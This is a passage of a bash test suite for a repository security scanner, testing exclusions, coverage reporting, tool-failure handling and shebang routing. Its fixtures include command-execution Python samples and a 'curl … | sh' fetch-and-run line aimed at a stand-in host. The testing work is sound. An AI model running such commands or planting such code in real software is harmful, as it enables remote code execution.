        python3 -c "
import json, sys
d = json.load(open(sys.argv[1]))
a = sys.argv[3] if len(sys.argv) > 3 else ''
print(eval(sys.argv[2]))" "$@" 2>/dev/null || echo "unreadable"
    }
    j_msgs() {   # j_msgs <report> <file_results key>: the messages recorded for one entry, or ABSENT
        j_py "$1" "d['file_results'].get(a, {}).get('message', 'ABSENT')" "$2"
    }
    j_hostile() {   # j_hostile <dir> <name>: a file the scan must fail
        mkdir -p "$1"; printf 'import os\nos.system(input())\nprint(eval(input()))\n' > "$1/$2"
    }

    # ── D-003: .transitignore is read the way it is written ───────────────────────────────
    # A last line with no newline used to be lost and a CRLF file never matched (the CR was part of the pattern).
    J3="${SCRATCH}/j3_nonl"; rm -rf "$J3"; j_hostile "$J3" a.py; j_hostile "$J3" b.py; printf 'print(1)\n' > "$J3/ok.py"
    printf 'a.py\nb.py' > "$J3/.transitignore"
    j_scan "$J3" j3_nonl
    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" \
        "D-003: the last line of .transitignore is read although it has no trailing newline"
    J3C="${SCRATCH}/j3_crlf"; rm -rf "$J3C"; j_hostile "$J3C" a.py; j_hostile "$J3C" b.py; printf 'print(1)\n' > "$J3C/ok.py"
    printf '# comment\r\n\r\na.py\r\nb.py\r\n' > "$J3C/.transitignore"
    j_scan "$J3C" j3_crlf
    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" \
        "D-003: a CRLF .transitignore works (one trailing CR is removed from each line)"
    J3D="${SCRATCH}/j3_crlf_only"; rm -rf "$J3D"; j_hostile "$J3D" a.py; j_hostile "$J3D" keep.py
    printf 'a.py\r\n' > "$J3D/.transitignore"
    j_scan "$J3D" j3_crlf_only
    assert_contains "$(j_msgs "$JREP" "${J3D}/keep.py")" "[FAIL]" \
        "D-003: …and a file the CRLF .transitignore does not name is still scanned"
    assert_eq "ABSENT" "$(j_msgs "$JREP" "${J3D}/a.py")" "D-003: …while the one it names is not"

    # ── D-004: exclusions leave a trace, and excluding everything is not a pass ───────────
    J4="${SCRATCH}/j4_trace"; rm -rf "$J4"; j_hostile "$J4" a.py; printf 'print(1)\n' > "$J4/ok.py"
    printf '# why\n\na.py\nb.py\n' > "$J4/.transitignore"
    j_scan "$J4" j4_trace
    assert_contains "$(j_msgs "$JREP" __global__)" "[WARN] transitignore:exclusions_applied(2 pattern(s))" \
        "D-004: .transitignore patterns are reported once, with their number (comments and blank lines do not count)"
    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-004: …and the WARN alone does not change the verdict"
    J4E="${SCRATCH}/j4_empty_file"; rm -rf "$J4E"; j_hostile "$J4E" a.py; printf '# nothing\n\n' > "$J4E/.transitignore"
    j_scan "$J4E" j4_empty_file
    assert_not_contains "$(j_msgs "$JREP" __global__)" "transitignore" \
        "D-004: a .transitignore with no pattern gives no WARN"
    J4S="${SCRATCH}/j4_star"; rm -rf "$J4S"; j_hostile "$J4S" a.py; printf 'password = "hunter2hunter2"\n' > "$J4S/cfg.py"
    printf '*\n' > "$J4S/.transitignore"
    j_scan "$J4S" j4_star
    assert_eq "FAIL" "$(j_py "$JREP" "d['verdict']")" "D-004: a .transitignore of * no longer passes a repository with nothing scanned"
    assert_eq "1" "$JEC" "D-004: …and the exit status says so"
    assert_contains "$(j_msgs "$JREP" __global__)" "[FAIL] engine:nothing_scanned" "D-004: …with the FAIL engine:nothing_scanned on __global__"
    assert_contains "$(j_msgs "$JREP" __global__)" "exclusions_applied(1 pattern(s))" "D-004: …next to the WARN"
    assert_eq "L4_patterns=skipped:nothing scanned (every file excluded) L5_per_language_sast=skipped:nothing scanned (every file excluded)" \
        "$(j_py "$JREP" "' '.join(k + '=' + d['coverage'][k] for k in ('L4_patterns', 'L5_per_language_sast'))")" \
        "D-004: layers 4 and 5 do not read as ran when every file was excluded"
    assert_contains "$(j_py "$JREP" "d['coverage_gaps']")" "L4_patterns" "D-004: …they are coverage gaps"
    assert_eq "1 engine:nothing_scanned __global__" \
        "$(j_py "$JREP" "' '.join(str(x) for x in (len(d['findings']), d['findings'][0]['message'], d['findings'][0]['file']))")" \
        "D-004: the nothing-scanned FAIL is a structured finding record"
    # The bar cannot be lowered and the finding cannot be allowlisted: the repository's author controls both.
    printf '[{"rule":"engine","path":"__global__","reason":"x"},{"rule":"nothing_scanned","path":"__global__","reason":"x"}]\n' > "$J4S/.transit-allow.json"
    JENV=(MIN_SEVERITY=critical); j_scan "$J4S" j4_star_crit; JENV=()
    assert_eq "FAIL" "$(j_py "$JREP" "d['verdict']")" \
        "D-004: engine:nothing_scanned is neither downgraded by --min-severity critical nor allowlisted"
    assert_contains "$(j_msgs "$JREP" __global__)" "[FAIL] engine:nothing_scanned" "D-004: …it stays a FAIL in the report"
    OUT_SCH=$(cd "$ROOT_DIR" && python3 -I tests/conformance/check_schema.py --report "$JREP" 2>&1); EC_SCH=$?
    assert_eq "0" "$EC_SCH" "D-004: the nothing-scanned report conforms to docs/report.schema.json and the invariants"
    [[ "$EC_SCH" == 0 ]] || printf '%s\n' "$OUT_SCH" | tail -n 5 >&2
    # Three situations that are NOT errors: they keep their behaviour.
    J4Z="${SCRATCH}/j4_emptydir"; rm -rf "$J4Z"; mkdir -p "$J4Z"
    j_scan "$J4Z" j4_emptydir
    assert_eq "PASS ran ran" "$(j_py "$JREP" "' '.join((d['verdict'], d['coverage']['L4_patterns'], d['coverage']['L5_per_language_sast']))")" \
        "D-004: an empty directory is still a PASS with layers 4 and 5 ran"
    J4B="${SCRATCH}/j4_builtin"; rm -rf "$J4B"; mkdir -p "$J4B/node_modules/x"; printf 'eval(input())\n' > "$J4B/node_modules/x/i.py"
    j_scan "$J4B" j4_builtin
    assert_eq "PASS ran" "$(j_py "$JREP" "' '.join((d['verdict'], d['coverage']['L4_patterns']))")" \
        "D-004: a repository whose files are all under the built-in exclusions is still a PASS (ran)"
    printf 'docs\n' > "$J4B/.transitignore"
    j_scan "$J4B" j4_builtin_ti
    assert_eq "PASS ran" "$(j_py "$JREP" "' '.join((d['verdict'], d['coverage']['L4_patterns']))")" \
        "D-004: …also with a .transitignore, because no file was removed by it (the built-in ones are not counted)"
    assert_contains "$(j_msgs "$JREP" __global__)" "exclusions_applied(1 pattern(s))" "D-004: …and the WARN is still there"
    J4D="${SCRATCH}/j4_diff"; rm -rf "$J4D"; mkdir -p "$J4D" "${SCRATCH}/j4_diffwork"
    printf 'print(1)\n' > "$J4D/ok.py"; printf 'zzz\n' > "$J4D/.transitignore"
    printf '%s:' "${J4D}/no_such_file.py" > "${SCRATCH}/j4_diffwork/.diff_files"
    (cd "$ROOT_DIR" && SINCE_COMMIT=abc WORK_DIR="${SCRATCH}/j4_diffwork" bash ./scan_pipeline.sh "$J4D" "$JR" j4_diff >/dev/null 2>&1) || true
    assert_eq "PASS ran" "$(j_py "${JR}/report_scan_j4_diff.json" "' '.join((d['verdict'], d['coverage']['L5_per_language_sast']))")" \
        "D-004: a diff run with no changed files is still a PASS (ran), with a .transitignore that excludes nothing"

    # ── D-038: no file is skipped because of its name ─────────────────────────────────────
    # .manifest_sha256.txt was skipped at any depth. ai_transit.sh keeps only the ROOT one (the fetcher's own) out
    # of the archive, so a nested file of that name carried any payload into the approved ZIP unscanned.
    J9="${SCRATCH}/j9_manifest"; rm -rf "$J9"; mkdir -p "$J9/sub"; printf 'print(1)\n' > "$J9/ok.py"
    printf 'password = "hunter2hunter2"\n' > "$J9/sub/.manifest_sha256.txt"
    j_scan "$J9" j9_nested
    assert_eq "FAIL" "$(j_py "$JREP" "d['verdict']")" "D-038: a payload in a nested .manifest_sha256.txt fails the repository"
    assert_contains "$(j_msgs "$JREP" "${J9}/sub/.manifest_sha256.txt")" "CWE-798:hardcoded_credential"         "D-038: …it is scanned like any file and has its own entry in the report"
    J9R="${SCRATCH}/j9_root"; rm -rf "$J9R"; mkdir -p "$J9R"; printf 'print(1)\n' > "$J9R/ok.py"
    printf 'password = "hunter2hunter2"\n' > "$J9R/.manifest_sha256.txt"
    j_scan "$J9R" j9_root
    assert_eq "FAIL" "$(j_py "$JREP" "d['verdict']")" "D-038: …and so is one at the root of the scanned directory"
    J9Z="${SCRATCH}/j9_zip"; rm -rf "$J9Z"; mkdir -p "$J9Z/sub"; printf 'print(1)\n' > "$J9Z/ok.py"
    printf 'e3b0c44298fc1c14  ./x\n' > "$J9Z/sub/.manifest_sha256.txt"
    run_pipeline "$J9Z" --quiet
    assert_eq "0" "$RUN_EXIT" "D-038: a harmless nested .manifest_sha256.txt does not fail the pipeline"
    assert_eq ".manifest_sha256.txt sub/.manifest_sha256.txt" \
        "$(j_py "$RUN_JSON" "' '.join(sorted(k.split('/fetch/', 1)[1].split('/', 1)[1] for k in d['file_results'] if k.endswith('manifest_sha256.txt')))")" \
        "D-038: …both the fetcher's root manifest and the nested file are in the report"
    ZIPLIST=$(unzip -Z1 "${RUN_WORK}"/out/*.zip 2>/dev/null | grep manifest || true)
    assert_eq "sub/.manifest_sha256.txt" "$ZIPLIST" \
        "D-038: ai_transit.sh keeps only the ROOT manifest out of the archive; a nested one ships, now that it was scanned"
    J9Y="${SCRATCH}/j9_ship"; rm -rf "$J9Y"; mkdir -p "$J9Y/sub"; printf 'print(1)\n' > "$J9Y/ok.py"
    printf 'password = "hunter2hunter2"\n' > "$J9Y/sub/.manifest_sha256.txt"
    run_pipeline "$J9Y" --quiet
    assert_eq "1" "$RUN_EXIT" "D-038: ai_transit.sh no longer approves a repository whose only payload is a nested .manifest_sha256.txt"
    assert_eq "0" "$(ls "${RUN_WORK}"/out/*.zip 2>/dev/null | wc -l | tr -d ' ')" "D-038: …and builds no archive for it"

    # ── D-005: a partially staged Semgrep rule set completes the run ──────────────────────
    # The last statement of scan_owasp_cwe was `[[ -z "${LAYER_COVERAGE[L2_owasp_cwe]:-}" ]] && record_layer … ran`.
    # With `partial:` already recorded that test is false, the function returns 1 and set -e ends the run: exit 1,
    # no report, no sidecar. The partial state could therefore never reach a report.
    j_stubdir() { local d="${SCRATCH}/j_st_$1"; rm -rf "$d"; mkdir -p "$d"; printf '%s' "$d"; }
    j_stub() {   # j_stub <dir> <tool> [sh body]  (body on stdin when omitted); records its arguments in <dir>/<tool>_calls.txt
        local body="${3-}"; [[ $# -ge 3 ]] || body=$(cat)
        printf '#!/bin/sh\necho "$@" >> "%s/%s_calls.txt"\n%s\n' "$1" "$2" "$body" > "$1/$2"; chmod +x "$1/$2"
    }
    J5S=$(j_stubdir sg_partial); j_stub "$J5S" semgrep "echo '{\"results\":[],\"errors\":[]}'"
    J5C="${SCRATCH}/j5_cache"; rm -rf "$J5C"; mkdir -p "$J5C/semgrep-rules"
    echo "rules: []" > "$J5C/semgrep-rules/owasp-top-ten.yaml"; echo "rules: []" > "$J5C/semgrep-rules/cwe-top-25.yaml"
    JENV=(PATH="${J5S}:${PATH}" OFFLINE_CACHE="$J5C"); j_scan "${FIXTURES}/clean" j5_partial; JENV=()
    assert_eq "0" "$JEC" "D-005: two of four Semgrep rule files staged: the run completes (it used to exit 1 with no report)"
    assert_eq "partial:rulesets missing (security-audit secrets)" "$(j_py "$JREP" "d['coverage']['L2_owasp_cwe']")" \
        "D-005: …and the report says partial, naming the rule sets that are missing"
    assert_contains "$(j_py "$JREP" "d['coverage_gaps']")" "L2_owasp_cwe" "D-005: …it is a coverage gap"
    assert_eq "False" "$(j_py "$JREP" "d['coverage_complete']")" "D-005: …so coverage is not complete"
    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-005: …and the verdict follows the findings (none)"
    assert_eq "2" "$(grep -c -- '--config=' "${J5S}/semgrep_calls.txt")" "D-005: …Semgrep ran once for each rule set that is staged"
    assert_eq "last-line-PASS" "last-line-$(printf '%s\n' "$JOUT" | tail -n 1 | sed 's/\x1b\[[0-9;]*m//g')" "D-005: …and the last line of output is the verdict"
    J5F=$(j_stubdir sg_partial_find)
    j_stub "$J5F" semgrep "echo '{\"results\":[{\"check_id\":\"rule.x\",\"path\":\"${FIXTURES}/clean/t.py\",\"start\":{\"line\":2},\"extra\":{\"message\":\"m\",\"severity\":\"ERROR\"}}]}'"
    JENV=(PATH="${J5F}:${PATH}" OFFLINE_CACHE="$J5C"); j_scan "${FIXTURES}/clean" j5_partial_find; JENV=()
    assert_eq "FAIL 2 partial" "$(j_py "$JREP" "d['verdict'] + ' ' + str(sum(1 for f in d['findings'] if f['tool'] == 'semgrep')) + ' ' + d['coverage']['L2_owasp_cwe'].split(':')[0]")" \
        "D-005: with a partial rule set, a finding of the rule sets that ran still fails the scan"

    # ── D-006: a ScanCode that was switched on and could not deliver says so in the coverage block ─────
    # Before, scan_error / no_report_generated / python3_missing left only a WARN and no L6_licence entry at all,
    # so coverage_complete could stay true with the licence layer never having produced anything.
    J6A=$(j_stubdir sc_fail); j_stub "$J6A" scancode "exit 3"
    JENV=(PATH="${J6A}:${PATH}" RUN_SCANCODE=true); j_scan "${FIXTURES}/clean" j6_fail; JENV=()
    assert_eq "skipped:scancode failed (exit 3)" "$(j_py "$JREP" "d['coverage'].get('L6_licence', 'ABSENT')")" \
        "D-006: ScanCode exiting non-zero: L6_licence is skipped, with the exit status"
    assert_contains "$(j_py "$JREP" "d['coverage_gaps']")" "L6_licence" "D-006: …it is a coverage gap"
    assert_eq "False" "$(j_py "$JREP" "d['coverage_complete']")" "D-006: …and coverage is not complete"
    assert_contains "$(j_msgs "$JREP" __global__)" "scancode:scan_error" "D-006: …the WARN is still recorded next to it"
    J6B=$(j_stubdir sc_noreport); j_stub "$J6B" scancode "exit 0"
    JENV=(PATH="${J6B}:${PATH}" RUN_SCANCODE=true); j_scan "${FIXTURES}/clean" j6_noreport; JENV=()
    assert_eq "skipped:scancode produced no report" "$(j_py "$JREP" "d['coverage'].get('L6_licence', 'ABSENT')")" \
        "D-006: ScanCode exiting 0 without writing a report: skipped, no report"
    assert_contains "$(j_msgs "$JREP" __global__)" "scancode:no_report_generated" "D-006: …with its WARN"
    J6C=$(j_stubdir sc_ok)
    j_stub "$J6C" scancode <<'EOF'
while [ $# -gt 0 ]; do case "$1" in --json-pp) out="$2" ;; esac; shift; done
echo '{"files":[]}' > "$out"
EOF
    JENV=(PATH="${J6C}:${PATH}" RUN_SCANCODE=true); j_scan "${FIXTURES}/clean" j6_ok; JENV=()
    assert_eq "ran" "$(j_py "$JREP" "d['coverage'].get('L6_licence', 'ABSENT')")" "D-006: a ScanCode that wrote a report is still ran"
    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-006: …and an empty result is a PASS"
    # python3 cannot be hidden from a whole run (the report writer needs it), so the function runs alone with a
    # has_cmd that does not find it.
    SC_FN=$(sed -n '/^scan_scancode() {/,/^}/p' "${ROOT_DIR}/scan_pipeline.sh")
    mkdir -p "${SCRATCH}/j6_py/reports"
    SC_PY=$(bash -c '
        set -euo pipefail
        declare -A LAYER_COVERAGE; WARNS=""
        info() { :; }; ok() { :; }; warn() { :; }
        has_cmd() { [[ "$1" != python3 ]]; }
        record_warn() { WARNS+="$*;"; }
        record_layer() { LAYER_COVERAGE["$1"]="$2"; }
        scancode() { while [ $# -gt 0 ]; do case "$1" in --json-pp) echo "{}" > "$2" ;; esac; shift; done; }
        OFFLINE=true; WORK_DIR="$1"; TIMESTAMP=t; SCAN_DIR=/nowhere; TRANSIT_DIR=/nowhere
        '"$SC_FN"'
        scan_scancode
        echo "${LAYER_COVERAGE[L6_licence]:-ABSENT}|$WARNS"' _ "${SCRATCH}/j6_py" 2>&1)
    assert_contains "$SC_PY" "skipped:python3 not available|" "D-006: python3 not found: L6_licence is skipped, python3 not available"
    assert_contains "$SC_PY" "scancode:python3_missing" "D-006: …with its WARN"

    # ── D-008: YARA is recorded when it ran, and when it had nothing to run ───────────────────────
    J8S=$(j_stubdir yara_ran); j_stub "$J8S" yara "exit 0"
    J8W="${SCRATCH}/j8_work"; rm -rf "$J8W"; mkdir -p "$J8W/yara-rules"; echo 'rule x { condition: false }' > "$J8W/yara-rules/x.yar"
    JENV=(PATH="${J8S}:${PATH}"); JWD="$J8W"; j_scan "${FIXTURES}/clean" j8_ran; JENV=(); JWD=""
    assert_eq "ran" "$(j_py "$JREP" "d['coverage'].get('L1_ioc_yara', 'ABSENT')")" "D-008: a YARA run with a rule file is recorded as ran"
    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-008: …and a rule with no match is a PASS"
    J8M=$(j_stubdir yara_hit); j_stub "$J8M" yara "echo 'x_rule /scanned/file'"
    JENV=(PATH="${J8M}:${PATH}"); JWD="$J8W"; j_scan "${FIXTURES}/clean" j8_hit; JENV=(); JWD=""
    assert_contains "$(j_msgs "$JREP" "${FIXTURES}/clean")" "yara:ioc_match:x.yar" "D-008: a rule that matches still fails the scan"
    assert_eq "ran" "$(j_py "$JREP" "d['coverage'].get('L1_ioc_yara', 'ABSENT')")" "D-008: …and the layer is ran"
    J8E="${SCRATCH}/j8_empty"; rm -rf "$J8E"; mkdir -p "$J8E/yara-rules"
    JENV=(PATH="${J8S}:${PATH}"); JWD="$J8E"; j_scan "${FIXTURES}/clean" j8_empty; JENV=(); JWD=""
    assert_eq "skipped:yara rules directory has no .yar files" "$(j_py "$JREP" "d['coverage'].get('L1_ioc_yara', 'ABSENT')")" \
        "D-008: yara installed, rules directory present but without a .yar file: skipped, and it says why"
    assert_contains "$(j_py "$JREP" "d['coverage_gaps']")" "L1_ioc_yara" "D-008: …it is a coverage gap"
    J8D="${SCRATCH}/j8_nodir"; rm -rf "$J8D"; mkdir -p "$J8D"
    JENV=(PATH="${J8S}:${PATH}"); JWD="$J8D"; j_scan "${FIXTURES}/clean" j8_nodir; JENV=(); JWD=""
    assert_eq "skipped:yara or rules directory missing" "$(j_py "$JREP" "d['coverage'].get('L1_ioc_yara', 'ABSENT')")" \
        "D-008: yara installed but no rules directory: the existing state is unchanged"

    # ── D-015: a tool that crashed, or printed what cannot be read, is not "ran, nothing found" ───────────
    # Semgrep, detect-secrets and trivy used to count unparseable output as zero findings with the layer ran, and
    # every non-zero exit of clamscan was clamav:malware_detected, so a scan error read as an infection.
    J15C="${SCRATCH}/j15_cache"; rm -rf "$J15C"; mkdir -p "$J15C/semgrep-rules" "$J15C/trivy-db/db" "$J15C/clamav"
    for _r in owasp-top-ten cwe-top-25 security-audit secrets; do echo "rules: []" > "$J15C/semgrep-rules/${_r}.yaml"; done
    touch "$J15C/trivy-db/db/trivy.db" "$J15C/clamav/main.cvd"
    j15_run() {   # j15_run <name> <env…>: the clean fixture with the stub directory J15S first on PATH
        local name="$1"; shift
        JENV=(PATH="${J15S}:${PATH}" OFFLINE_CACHE="$J15C" "$@"); j_scan "${FIXTURES}/clean" "$name"; JENV=()
    }
    j15_cov() { j_py "$JREP" "d['coverage'].get('$1', 'ABSENT')"; }

    # Semgrep (layer 2)
    J15S=$(j_stubdir sg_crash); j_stub "$J15S" semgrep "echo 'Traceback (most recent call last)'; exit 7"
    j15_run j15_sg_crash
    assert_eq "skipped:semgrep failed (exit 7)" "$(j15_cov L2_owasp_cwe)" "D-015: Semgrep crashing (exit 7) is not ran"
    assert_contains "$(j_msgs "$JREP" __global__)" "[WARN] semgrep:scan_error_exit_7" "D-015: …a WARN says which rule set and which exit status"
    assert_contains "$(j_py "$JREP" "d['coverage_gaps']")" "L2_owasp_cwe" "D-015: …it is a coverage gap"
    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-015: …and the verdict still follows the findings (none were produced)"
    J15S=$(j_stubdir sg_garbage); j_stub "$J15S" semgrep "echo 'this is not json'"
    j15_run j15_sg_garbage
    assert_eq "skipped:semgrep output could not be read" "$(j15_cov L2_owasp_cwe)" "D-015: Semgrep exiting 0 with output that is not JSON is not ran"
    assert_contains "$(j_msgs "$JREP" __global__)" "semgrep:output_could_not_be_read" "D-015: …with its WARN"
    J15S=$(j_stubdir sg_empty); j_stub "$J15S" semgrep "exit 0"
    j15_run j15_sg_empty
    assert_eq "skipped:semgrep output could not be read" "$(j15_cov L2_owasp_cwe)" "D-015: Semgrep printing nothing is not ran"
    J15S=$(j_stubdir sg_nores); j_stub "$J15S" semgrep "echo '{}'"
    j15_run j15_sg_nores
    assert_eq "skipped:semgrep output could not be read" "$(j15_cov L2_owasp_cwe)" "D-015: JSON without a results list is not ran either"
    J15S=$(j_stubdir sg_one_bad)
    j_stub "$J15S" semgrep <<EOF
case "\$*" in *cwe-top-25*) exit 2 ;; esac
echo '{"results":[{"check_id":"rule.x","path":"${FIXTURES}/clean/t.py","start":{"line":2},"extra":{"message":"m","severity":"ERROR"}}]}'
EOF
    j15_run j15_sg_one_bad
    assert_eq "skipped:semgrep failed (exit 2)" "$(j15_cov L2_owasp_cwe)" "D-015: one rule set failing out of four makes the layer not ran"
    assert_eq "FAIL 3" "$(j_py "$JREP" "d['verdict'] + ' ' + str(sum(1 for f in d['findings'] if f['tool'] == 'semgrep'))")" \
        "D-015: …while the findings of the three that ran are kept and fail the scan"
    J15S=$(j_stubdir sg_exit1); j_stub "$J15S" semgrep "echo '{\"results\":[],\"errors\":[]}'; exit 1"
    j15_run j15_sg_exit1
    assert_eq "ran" "$(j15_cov L2_owasp_cwe)" "D-015: Semgrep exiting 1 with readable JSON is understood: ran"
    J15S=$(j_stubdir sg_ok); j_stub "$J15S" semgrep "echo '{\"results\":[]}'"
    j15_run j15_sg_ok
    assert_eq "ran" "$(j15_cov L2_owasp_cwe)" "D-015: a readable empty result is still ran"

    # detect-secrets (layer 1)
    J15S=$(j_stubdir ds_crash); j_stub "$J15S" detect-secrets "echo 'boom' >&2; exit 7"
    j15_run j15_ds_crash
    assert_eq "skipped:detect-secrets failed (exit 7)" "$(j15_cov L1_secrets_entropy)" "D-015: detect-secrets crashing (exit 7) is not ran"
    assert_contains "$(j_msgs "$JREP" __global__)" "[WARN] detect-secrets:scan_error_exit_7" "D-015: …with a WARN"
    J15S=$(j_stubdir ds_garbage); j_stub "$J15S" detect-secrets "echo 'garbage'"
    j15_run j15_ds_garbage
    assert_eq "skipped:detect-secrets output could not be read" "$(j15_cov L1_secrets_entropy)" "D-015: detect-secrets printing garbage is not ran"
    assert_contains "$(j_msgs "$JREP" __global__)" "detect-secrets:output_could_not_be_read" "D-015: …with a WARN"
    assert_eq "0" "$(j_py "$JREP" "d['summary']['pass'] - $(j_py "${JR}/report_scan_j15_sg_ok.json" "d['summary']['pass']")")" \
        "D-015: …and no PASS is counted for the layer that did not read"
    J15S=$(j_stubdir ds_ok); j_stub "$J15S" detect-secrets "echo '{\"version\":\"1.5\",\"results\":{}}'"
    j15_run j15_ds_ok
    assert_eq "ran" "$(j15_cov L1_secrets_entropy)" "D-015: a readable result with no secrets is ran"
    J15S=$(j_stubdir ds_hits); j_stub "$J15S" detect-secrets "echo '{\"results\":{\"a.py\":[{\"type\":\"x\"},{\"type\":\"y\"}]}}'"
    j15_run j15_ds_hits
    assert_eq "ran" "$(j15_cov L1_secrets_entropy)" "D-015: detect-secrets with hits is ran…"
    assert_contains "$(j_msgs "$JREP" "${FIXTURES}/clean")" "detect-secrets:2_high_entropy_string(s)" "D-015: …and its hits still fail the scan"

    # trivy (layer 3, RUN_SCA=true)
    J15S=$(j_stubdir tv_crash); j_stub "$J15S" trivy "exit 5"
    j15_run j15_tv_crash RUN_SCA=true
    assert_eq "skipped:trivy failed (exit 5)" "$(j15_cov L3_dependency_cve)" "D-015: trivy crashing (exit 5) is not ran"
    assert_contains "$(j_msgs "$JREP" __global__)" "[WARN] trivy:scan_error_exit_5" "D-015: …with a WARN"
    J15S=$(j_stubdir tv_garbage); j_stub "$J15S" trivy "echo 'not json'"
    j15_run j15_tv_garbage RUN_SCA=true
    assert_eq "skipped:trivy output could not be read" "$(j15_cov L3_dependency_cve)" "D-015: trivy printing garbage is not ran"
    assert_not_contains "$JOUT" "trivy: no known CVEs" "D-015: …and the console does not claim there are no known CVEs"
    J15S=$(j_stubdir tv_ok); j_stub "$J15S" trivy "echo '{\"SchemaVersion\":2,\"Results\":[]}'"
    j15_run j15_tv_ok RUN_SCA=true
    assert_eq "ran" "$(j15_cov L3_dependency_cve)" "D-015: a readable trivy result is ran"
    assert_contains "$JOUT" "trivy: no known CVEs" "D-015: …and says so"
    J15S=$(j_stubdir tv_vuln); j_stub "$J15S" trivy "echo '{\"Results\":[{\"Vulnerabilities\":[{\"VulnerabilityID\":\"CVE-1\"},{\"VulnerabilityID\":\"CVE-2\"}]}]}'"
    j15_run j15_tv_vuln RUN_SCA=true
    assert_contains "$(j_msgs "$JREP" "${FIXTURES}/clean")" "trivy:2_vulnerable_dependencies" "D-015: trivy findings still fail the scan"
    J15S=$(j_stubdir tv_nodb); j_stub "$J15S" trivy "echo '{\"Results\":[]}'"
    JENV=(PATH="${J15S}:${PATH}" OFFLINE_CACHE="${SCRATCH}/j15_nodb" RUN_SCA=true); j_scan "${FIXTURES}/clean" j15_tv_nodb; JENV=()
    assert_eq "skipped:trivy database not staged for offline use" "$(j15_cov L3_dependency_cve)" "D-015: trivy with no staged database: the existing state is unchanged"
    assert_not_contains "$JOUT" "trivy: no known CVEs" "D-015: …and it no longer claims there are no known CVEs, nor counts a PASS, for a scan that did not happen"
    assert_eq "no-calls" "$([[ -f "${J15S}/trivy_calls.txt" ]] && echo calls || echo no-calls)" "D-015: …trivy is not even started"

    # clamscan (layer 1)
    J15S=$(j_stubdir cl_clean); j_stub "$J15S" clamscan "exit 0"
    j15_run j15_cl_clean
    assert_eq "ran" "$(j15_cov L1_malware)" "D-015: clamscan exit 0 is clean: ran"
    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-015: …a PASS"
    J15S=$(j_stubdir cl_virus); j_stub "$J15S" clamscan "echo 'x: Eicar FOUND'; exit 1"
    j15_run j15_cl_virus
    assert_eq "FAIL" "$(j_py "$JREP" "d['verdict']")" "D-015: clamscan exit 1 is an infection: FAIL"
    assert_contains "$(j_msgs "$JREP" "${FIXTURES}/clean")" "clamav:malware_detected" "D-015: …clamav:malware_detected"
    assert_eq "ran" "$(j15_cov L1_malware)" "D-015: …and the layer is ran"
    J15S=$(j_stubdir cl_error); j_stub "$J15S" clamscan "echo 'ERROR: Can not open file' >&2; exit 2"
    j15_run j15_cl_error
    assert_eq "skipped:clamav failed (exit 2)" "$(j15_cov L1_malware)" "D-015: clamscan exit 2 is a tool error, not ran"
    assert_not_contains "$(j_py "$JREP" "d['file_results']")" "malware_detected" "D-015: …it is not reported as malware"
    assert_contains "$(j_msgs "$JREP" __global__)" "[WARN] clamav:scan_error_exit_2" "D-015: …a WARN says what happened"
    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-015: …and the verdict follows the findings (none)"
    JENV=(PATH="${J15S}:${PATH}" OFFLINE_CACHE="${SCRATCH}/j15_nosig"); j_scan "${FIXTURES}/clean" j15_cl_nosig; JENV=()
    assert_eq "skipped:clamav failed (exit 2)" "$(j15_cov L1_malware)" \
        "D-015: clamscan failing with no signatures staged: the failure is what the layer reports"

    # ── D-029: the exclusion rules read a file that contains a NUL byte ───────────────────────────────
    # grep_check_excl pipes one grep into a second. On a file with a NUL byte the first grep treats the file as
    # binary and prints nothing to the pipe, so the second reads nothing and the rule can never match: one NUL byte
    # silenced pip:vcs_requirement_not_pinned_to_a_commit and every other rule that uses an exclusion.
    J29="${SCRATCH}/j29_nul"; rm -rf "$J29"; mkdir -p "$J29/pinned" "$J29/xml"
    printf 'requests==2.0\0\ngit+https://github.com/org/repo#egg=repo\n' > "$J29/requirements.txt"
    printf 'requests==2.0\0\ngit+https://github.com/org/repo@abcdef1234567#egg=repo\n' > "$J29/pinned/requirements.txt"
    printf '<settings>\0\n<password>hunter2hunter2</password>\n</settings>\n' > "$J29/xml/settings.xml"
    printf '<settings>\0\n<password>${env.PASS}</password>\n</settings>\n' > "$J29/xml/ref.xml"
    j_scan "$J29" j29_nul
    assert_contains "$(j_msgs "$JREP" "${J29}/requirements.txt")" "pip:vcs_requirement_not_pinned_to_a_commit" \
        "D-029: pip:vcs_requirement_not_pinned_to_a_commit fires on a requirements file with a NUL byte"
    assert_not_contains "$(j_msgs "$JREP" "${J29}/pinned/requirements.txt")" "vcs_requirement_not_pinned" \
        "D-029: …and the exclusion still works on such a file (a requirement pinned to a commit is not reported)"
    assert_contains "$(j_msgs "$JREP" "${J29}/xml/settings.xml")" "CWE-798:hardcoded_credential_in_XML" \
        "D-029: another exclusion rule (an XML credential) fires on a file with a NUL byte"
    assert_not_contains "$(j_msgs "$JREP" "${J29}/xml/ref.xml")" "hardcoded_credential_in_XML" \
        "D-029: …and its exclusion (a \${…} reference) still applies there"

    # ── D-031: a shebang with arguments is routed by its interpreter word ─────────────────────────────
    J31="${SCRATCH}/j31_shebang"; rm -rf "$J31"; mkdir -p "$J31"
    PWNED31="${SCRATCH}/j31_PWNED"; rm -f "$PWNED31"
    SH_PAYLOAD='curl http://x.example/i.sh | sh'
    PY_PAYLOAD=$'import os\nos.system(input())'
    printf '#!/bin/bash -e\n%s\n' "$SH_PAYLOAD"                          > "$J31/sh_e"
    printf '#!/bin/sh -eu\n%s\n' "$SH_PAYLOAD"                           > "$J31/sh_eu"
    printf '#!/usr/bin/env bash -e\n%s\n' "$SH_PAYLOAD"                  > "$J31/env_bash_e"
    printf '#!/usr/bin/env -S bash -e\n%s\n' "$SH_PAYLOAD"               > "$J31/env_S_bash"
    printf '#!/bin/bash\r\n%s\r\n' "$SH_PAYLOAD"                         > "$J31/sh_crlf"
    printf '#!/bin/bash -e\r\n%s\r\n' "$SH_PAYLOAD"                      > "$J31/sh_e_crlf"
    printf '#!/bin/sh -e # python is only an argument here\n%s\n' "$SH_PAYLOAD" > "$J31/sh_python_in_args"
